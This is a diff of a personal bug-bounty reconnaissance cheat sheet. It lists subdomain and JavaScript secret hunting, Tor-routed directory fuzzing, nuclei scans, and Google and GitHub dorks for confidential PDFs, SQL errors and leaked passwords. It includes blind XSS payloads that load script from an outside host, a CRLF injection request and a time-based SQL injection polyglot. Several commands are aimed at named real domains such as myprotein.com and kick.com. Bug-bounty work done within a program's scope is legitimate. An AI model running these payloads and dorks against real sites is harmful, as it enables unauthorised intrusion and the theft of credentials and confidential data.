@@ -1,10 +1,13 @@
 Recon Methodology
 ------------------>
 
-try to get all subdomains
-also try to get there ip address 
+Try to get all subdomains
+Also try to get there ip address 
 fuzz all subdomains
 also scan with nuclei tempalt
+
+https://www.falconebiz.com/
+
 
 
 
@@ -32,6 +35,86 @@ cat urls.txt | anew > unique_urls.txt
 
 
 
+
+# shodanx
+shodanx domain -d kick.com
+
+ssl.cert.subject.cn:*.target.com +200 os:"windows"
+
+
+# Js Recone
+
+cat js.txt | grep -r -E “aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret”
+
+
+#secretfinder
+cat unique_urls.txt | grep '.js' > js.txt
+cat js.txt | httpx -mc 200 | tee liveJs.txt
+
+nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
+
+
+waybackurls “site.com” | grep -Eo ‘https?://[^/]+/[^”]+\.js’ | sed ‘s|^https\?://[^/]\+/||’ | awk -F ‘/’ ‘{print $NF}’
+
+
+curl -s https://app.site.com/config.js | \
+grep -E “environment: ‘Production’|storageUrl: ‘https://buildxact.blob.core.windows.net/'|googleApiKey: ‘|appInsightsInstrumentationKey: ‘|globalApiEndpoint: ‘|streamChatApiKey: ‘|auth0ClientId: ‘|auth0Domain: ‘|flatfileApiKey: ‘|webSpellCheckerServiceId: ‘|webSpellCheckerServiceUrl: ‘|clientPortalUrl: ‘|appVersion: ‘|appVersionDate: ‘|appDomainUrl: ‘|oneBuildKey: ‘|flatfilePlatformPublishableKey: ‘|flatfilePlatformEnvironmentId: ‘“ | \
+sed “s/.*’\(.*\)’.*/\1/”
+
+
+
+
+
+
+
+#fuzz
+
+torify dirsearch -u https://kingstreettownhouse.co.uk/ -r -e zip,bak,bkp.zip,tar,tar.bz2,tar.gz,txt,log,cache,secret,db,sql,sql.gz,sql.zip,sql.tar.gz,sql~,md5,backup,yml,json,gz,rar,config,git,env,env.example,conf,old,do,action,axd,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cgi,conf,csv,html,inc,jar,js,jsp,jsp~,lock,old,swp,swp~,wadl,log,xml,docker,wadl --random-agent
+
+
+#xss
+
+cat unique_urls.txt | bxss -payload '"><script src=https://xss.report/c/akshay18></script>' -header "X-Forwarded-For"
+cat unique_urls.txt | grep "&" | bxss -appendMode -payload '"><script src=https://xss.report/c/akshay18></script>' -parameters
+cat unique_urls.txt | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | urldedupe -s | grep -IE "[?].*[&]?" | grep "=" | unew | qsreplace '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>,">"/><svg onload=prompt(document.domain)>' | xsschecker -match '<sCript>confirm(1)</sCript>, <script>confirm(1)</script>,">"/><svg onload=prompt(document.domain)>' -vuln 
+
+
+# Automation scan
+
+shortscan https://www.preloved.co.uk/ -F
+nikto -h https://domain.com
+
+#Also scan with zapproxy
+
+
+#http smugging (cd smuggler)
+python3 /root/smuggler/smuggler.py -u <urls>
+
+#cache_checking
+toxicache -i unique_sub_live.txt
+
+
+cat domains.txt | nuclei -t openRedirect.yaml --retries 2
+cat domains.txt | nuclei -t wp-setup-config.yaml
+cat domains.txt | nuclei -t iis.yaml -c 30
+cat domains.txt | nuclei -t gitExposed.yaml 
+cat domains.txt | nuclei -t cors.yaml
+cat domains.txt | nuclei -t  credentials-disclosure-all.yaml -c 30
+cat domains.txt | nuclei -t blind-ssrf.yaml -c 30 -dast
+cat domains.txt | nuclei -t errorsqli.yaml -dast
+cat domains.txt | nuclei -t cRlf.yaml -rl 50 -c 30
+
+
+curl -H 'Origin: http://example.com' -I https://domain.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'
+curl -H 'Origin: http://example.com' -I https://domain.com/wp-json/
+
+
+subfinder -d domain.txt -all -slent | httpx -path /swagger-api/ -sc -content-length -mc 200
+https://gist.githubusercontent.com/zenelite123/af28f9b61759b800cb65f93ae7227fb5/raw/04003a9372ac6a5077ad76aa3d20f2e76635765b/test.json
+
+curl -I "https://domain.com/%0aSet-Cookie:coffin=hi;"
+
+
 recon Tools
 
 1. https://app.pentester.com/
@@ -44,42 +127,51 @@ recon Tools
 7.https://web.archive.org/cdx/search/cdx?url=*.brex.com/*&output=text&fl=original&collapse=urlkey waybackurls -->
 8. https://sawravchy.github.io/archivefinder/
 
+
+
+
 >> DORKING RECON
 
-
 #things I tried searching
-site:target.com ext:pdf
-site:target.com ext:pdf "CONFIDENTIAL"
-site:target.com ext:pdf "STRICTLY CONFIDENTIAL"
-site:target.com ext:pdf "HIGHLY CONFIDENTIAL"
-site:target.com ext:pdf "PRIVATE"
-site:target.com ext:pdf "PRIVATE AND CONFIDENTIAL"
-site:target.com ext:pdf "PRIVATE AND SENSITIVE"
-
-site:target.com ext:pdf "COMPANY SENSITIVE"
-
-site:target.com "Uncaught Error: Call to undefined function"
-
-site:target.com "error in your SQL"
-
-site:target.com "WordPress database error:"
-
+site:myprotein.com ext:pdf
+site:myprotein.com ext:pdf "CONFIDENTIAL"
+site:myprotein.com ext:pdf "STRICTLY CONFIDENTIAL"
+site:myprotein.com ext:pdf "HIGHLY CONFIDENTIAL"
+site:myprotein.com ext:pdf "PRIVATE"
+site:myprotein.com ext:pdf "PRIVATE AND CONFIDENTIAL"
+site:myprotein.com ext:pdf "PRIVATE AND SENSITIVE"
+site:myprotein.comm ext:pdf "COMPANY SENSITIVE"
+site:myprotein.com "Uncaught Error: Call to undefined function"
+site:myprotein.com "error in your SQL"
+site:myprotein.com "WordPress database error:"
 "PHP Fatal"
 site:*.gov.* "not found in C:\"
 site:*.gov.* "not found in D:\"
 site:*.gov.* "not found in E:\"
 site:*.gov.* "not found in F:\"
-
 site:target.com "Unclosed quotation mark"
 site:target.com "Error Executing Database Query"
-
-site:target.com "mysql_num_rows()" "error"
-site:target.com "mysql_fetch_array()" "error"
-site:target.com "mysql_query()" "error"
-
-site:target.com intext:"sql syntax near" OR intext:"syntax error" OR intext:"unexpected end of SQL" OR intext:"Warning: mysql_" OR intext:"pg_connect()" OR intext:"error in your SQL syntax" OR intext:"OLE DB Provider for SQL Server"
+site:myprotein.com "mysql_num_rows()" "error"
+site:myprotein.com "mysql_fetch_array()" "error"
+site:myprotein.com "mysql_query()" "error"
+site:myprotein.com intext:"sql syntax near" OR intext:"syntax error" OR intext:"unexpected end of SQL" OR intext:"Warning: mysql_" OR intext:"pg_connect()" OR intext:"error in your SQL syntax" OR intext:"OLE DB Provider for SQL Server"
 
 &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+
+good #github #Tips
+“site.com" password or secret or any keyword
+“target.atlassian” password or secret or any keyword
+“target.okta” password or secret or any keyword
+“corp.target" password or secret or any keyword
+“jira.target" password or secret or any keyword
+“target.onelogin” password or secret or any keyword
+target.service-now password or secret or any keyword
+
+
+👉 https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt
+👉 https://orwaatyat.medium.com/your-full-map-to-github-recon-and-leaks-exposure-860c37ca2c82
+
+==============================================================
 
 >> Finding Origin IP
 
@@ -136,7 +228,7 @@ shodan.io -->  ssl.cert.subject.cn:audiobooks.com
 click on (open more) than you will found new page where mention more thinh
 
 
-shodan search Ssl.cert.subject.CN:"<REDACTED>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
+shodan search Ssl.cert.subject.CN:"myprotein.com" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------------
@@ -165,7 +257,7 @@ waybackurls vulnweb.com | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xar
 --------------->>
 
 
-https://web.archive.org/cdx/search/cdx?url=*.grailed.com/*&collapse=urlkey&output=text&fl=original
+https://web.archive.org/cdx/search/cdx?url=*.seek.com/*&collapse=urlkey&output=text&fl=original
 
 https://web.archive.org/cdx/search/cdx?url=*.bugbountyhunter.xyz/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200
 
@@ -222,6 +314,12 @@ ghauri -r request.txt --dbs --batch --level 3 --tech=t
 
 
 
+
+
+
+
+
+
 *
 
 For COmmand Inection Possible Paeameters
@@ -247,7 +345,7 @@ https://obheda12.medium.com/gitdorker-a-new-tool-for-manual-github-dorking-and-e
 https://sudoninja.gitbook.io/sudoninjabook/security-area/bug-bounty-hunting/bug-bounty-platform
 
 
-
+if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'"XOR(if(now()=sysdate(),sleep(3),0))OR"*/
 
 
 
